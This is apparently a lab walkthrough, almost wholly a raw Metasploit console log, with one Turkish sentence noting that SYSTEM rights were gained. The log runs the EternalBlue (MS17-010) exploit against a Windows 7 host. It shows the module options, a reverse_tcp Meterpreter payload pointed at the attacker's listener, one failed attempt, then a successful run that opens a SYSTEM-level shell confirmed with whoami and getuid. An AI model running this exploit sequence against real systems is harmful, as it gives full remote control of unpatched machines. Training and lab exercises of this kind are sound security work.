```
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
                                             tml
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windo
                                             ws 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7
                                             , Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                             Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.11.106.146    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[-] Msf::OptionValidateError The following options failed to validate: RHOSTS
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set  RHOSTS 10.10.190.146
RHOSTS => 10.10.190.146
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[*] Started reverse TCP handler on 10.11.106.146:4444 
[*] 10.10.190.146:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.190.146:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.190.146:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.190.146:445 - The target is vulnerable.
[*] 10.10.190.146:445 - Connecting to target for exploitation.
[+] 10.10.190.146:445 - Connection established for exploitation.
[+] 10.10.190.146:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.190.146:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.190.146:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.190.146:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.190.146:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.190.146:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.190.146:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.190.146:445 - Sending all but last fragment of exploit packet
[*] 10.10.190.146:445 - Starting non-paged pool grooming
[+] 10.10.190.146:445 - Sending SMBv2 buffers
[+] 10.10.190.146:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.190.146:445 - Sending final SMBv2 buffers.
[*] 10.10.190.146:445 - Sending last fragment of exploit packet!
[*] 10.10.190.146:445 - Receiving response from exploit packet
[+] 10.10.190.146:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.190.146:445 - Sending egg to corrupted connection.
[*] 10.10.190.146:445 - Triggering free of corrupted buffer.
[-] 10.10.190.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.190.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.190.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.190.146:445 - Connecting to target for exploitation.
[+] 10.10.190.146:445 - Connection established for exploitation.
[+] 10.10.190.146:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.190.146:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.190.146:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.190.146:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.190.146:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.190.146:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.190.146:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.190.146:445 - Sending all but last fragment of exploit packet
[*] 10.10.190.146:445 - Starting non-paged pool grooming
[+] 10.10.190.146:445 - Sending SMBv2 buffers
[+] 10.10.190.146:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.190.146:445 - Sending final SMBv2 buffers.
[*] 10.10.190.146:445 - Sending last fragment of exploit packet!
[*] 10.10.190.146:445 - Receiving response from exploit packet
[+] 10.10.190.146:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.190.146:445 - Sending egg to corrupted connection.
[*] 10.10.190.146:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.190.146
[*] Meterpreter session 1 opened (10.11.106.146:4444 -> 10.10.190.146:49203) at 2024-10-29 17:20:39 +0300
[+] 10.10.190.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.190.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.190.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

(Meterpreter 1)(C:\Windows\system32) > shell
Process 2312 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```


```
[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Windows\system32) > 

```

"getuid" ile sistemde AUTHORITY\SYSTEM düzeyinde yetkili olduğumuzu anladık.

```
(Meterpreter 1)(C:\) > getuid
Server username: NT AUTHORITY\SYSTEM
```

